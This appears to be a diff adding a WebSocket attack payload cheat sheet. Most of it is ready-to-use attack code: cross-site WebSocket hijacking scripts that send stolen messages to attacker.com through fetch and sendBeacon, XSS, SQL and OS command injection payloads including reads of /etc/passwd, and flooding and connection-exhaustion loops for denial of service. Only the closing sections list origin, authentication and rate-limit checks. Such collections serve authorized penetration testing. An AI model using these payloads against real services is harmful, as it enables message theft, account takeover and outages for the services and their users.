@@ -1,0 +1,232 @@
+# WebSocket Payloads
+
+## ========================================
+## BASIC WEBSOCKET CONNECTION
+## ========================================
+
+# JavaScript WebSocket
+var ws = new WebSocket('ws://target.com/socket');
+var ws = new WebSocket('wss://target.com/socket');
+
+# Connection with protocols
+var ws = new WebSocket('ws://target.com', ['protocol1', 'protocol2']);
+
+## ========================================
+## CROSS-SITE WEBSOCKET HIJACKING (CSWSH)
+## ========================================
+
+# Basic CSWSH exploit
+<script>
+var ws = new WebSocket('ws://target.com/chat');
+ws.onopen = function() {
+  ws.send('malicious message');
+};
+ws.onmessage = function(e) {
+  // Steal data
+  fetch('http://attacker.com/steal?data=' + e.data);
+};
+</script>
+
+## ========================================
+## WEBSOCKET INJECTION
+## ========================================
+
+# Message injection
+{"type":"message","content":"<script>alert(1)</script>"}
+
+# Command injection
+{"command":"exec","args":"whoami"}
+
+# JSON injection
+{"user":"admin\",\"role\":\"admin\",\"fake\":\"value"}
+
+## ========================================
+## DOS ATTACKS
+## ========================================
+
+# Message flooding
+<script>
+var ws = new WebSocket('ws://target.com');
+ws.onopen = function() {
+  for(let i=0; i<10000; i++) {
+    ws.send('x'.repeat(1000000));
+  }
+};
+</script>
+
+# Connection exhaustion
+for(let i=0; i<1000; i++) {
+  new WebSocket('ws://target.com');
+}
+
+## ========================================
+## AUTHENTICATION BYPASS
+## ========================================
+
+# Missing origin check
+Origin: http://attacker.com
+
+# Cookie theft
+document.cookie
+
+# Token manipulation
+{"token":"modified_token","action":"admin"}
+
+## ========================================
+## DATA EXFILTRATION
+## ========================================
+
+# Steal messages
+var ws = new WebSocket('ws://target.com/private');
+ws.onmessage = function(e) {
+  navigator.sendBeacon('http://attacker.com/log', e.data);
+};
+
+## ========================================
+## PROTOCOL CONFUSION
+## ========================================
+
+# HTTP smuggling via WebSocket
+GET / HTTP/1.1
+Upgrade: websocket
+Connection: Upgrade
+
+# Switching protocols
+HTTP/1.1 101 Switching Protocols
+Upgrade: websocket
+
+## ========================================
+## XSS VIA WEBSOCKET
+## ========================================
+
+# Send XSS payload
+ws.send('<img src=x onerror=alert(1)>');
+ws.send('<script>alert(document.domain)</script>');
+
+## ========================================
+## SQL INJECTION
+## ========================================
+
+# SQLi in WebSocket message
+{"query":"' OR '1'='1"}
+{"search":"admin' --"}
+
+## ========================================
+## COMMAND INJECTION
+## ========================================
+
+# OS command injection
+{"file":"test.txt; whoami"}
+{"action":"process","args":"`whoami`"}
+
+## ========================================
+## TESTING PAYLOADS
+## ========================================
+
+# Test connection
+var ws = new WebSocket('ws://target.com/echo');
+ws.onopen = () => ws.send('test');
+ws.onmessage = (e) => console.log(e.data);
+
+# Test authentication
+var ws = new WebSocket('ws://target.com/auth');
+ws.send(JSON.stringify({token: 'test123'}));
+
+## ========================================
+## SUBDOMAIN TAKEOVER
+## ========================================
+
+# WebSocket subdomain
+ws://old-chat.target.com
+(If subdomain is unclaimed)
+
+## ========================================
+## RATE LIMIT BYPASS
+## ========================================
+
+# Multiple connections
+for(let i=0; i<100; i++) {
+  let ws = new WebSocket('ws://target.com');
+  ws.onopen = () => ws.send('spam');
+}
+
+## ========================================
+## TOOLS
+## ========================================
+
+# wscat
+wscat -c ws://target.com/socket
+
+# websocat
+websocat ws://target.com/socket
+
+# Burp Suite
+WebSocket history
+WebSocket repeater
+
+# Python websocket-client
+import websocket
+ws = websocket.create_connection("ws://target.com")
+ws.send("Hello")
+result = ws.recv()
+
+## ========================================
+## EXPLOITATION EXAMPLES
+## ========================================
+
+# Example 1: Chat hijacking
+<script>
+var ws = new WebSocket('ws://chat.target.com');
+ws.onmessage = function(e) {
+  fetch('http://attacker.com/log?msg=' + e.data);
+};
+</script>
+
+# Example 2: Command execution
+ws.send(JSON.stringify({
+  cmd: 'exec',
+  args: 'cat /etc/passwd'
+}));
+
+## ========================================
+## REAL-WORLD SCENARIOS
+## ========================================
+
+# Scenario 1: Trading platform
+Manipulate order messages
+
+# Scenario 2: Chat application
+Send malicious messages
+XSS via chat
+
+# Scenario 3: Real-time dashboards
+Inject false data
+DOS with flooding
+
+## ========================================
+## SECURITY TESTING
+## ========================================
+
+# Check origin validation
+Origin: http://evil.com
+
+# Check authentication
+Connect without credentials
+
+# Check rate limiting
+Send 1000 messages/sec
+
+# Check input validation
+Send XSS/SQLi payloads
+
+## ========================================
+## MITIGATION TESTING
+## ========================================
+
+# Verify:
+- Origin header validation
+- Authentication required
+- Rate limiting exists
+- Input sanitization
+- TLS encryption (wss://)
+- CSRF token validation
